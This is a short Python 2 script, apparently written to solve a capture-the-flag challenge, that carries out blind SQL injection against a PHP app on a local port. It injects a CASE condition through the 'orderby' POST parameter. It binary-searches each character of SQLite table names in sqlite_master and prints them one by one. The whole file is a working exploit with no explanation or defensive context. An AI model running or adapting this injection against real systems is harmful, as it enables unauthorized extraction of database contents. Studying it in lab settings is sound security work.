import requests
from urllib import quote
import string
import sys

# kopas dari burpsuite pake plugin 'copy as python request'
burp0_url = "http://0.0.0.0:10369/index.php"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://0.0.0.0:10369", "Connection": "close", "Referer": "http://0.0.0.0:10369/index.php", "Upgrade-Insecure-Requests": "1"}

# DUMP TABLE NAMES
dump_data = ''

for i in range(1, 1000):
	l = 0
	r = 255
	
	# binary search blind sql
	while l <= r:
		m = (l+r) / 2
		guess_query = "(SELECT unicode(substr(tbl_name,%d,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%%' limit 1 offset 1)" % i
		inject = "id limit (case when (%s > %s) then 1 else 0 end); -- " % (guess_query, m)
		burp0_data = {"query": "a", "orderby":  inject}

		resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
		if 'array' in resp.text[:20]:
			l = m+1
		else:
			r = m-1

	if chr(l) not in string.printable:
		break

	dump_data += chr(l)
	sys.stdout.write(chr(l))
	sys.stdout.flush()

print ''
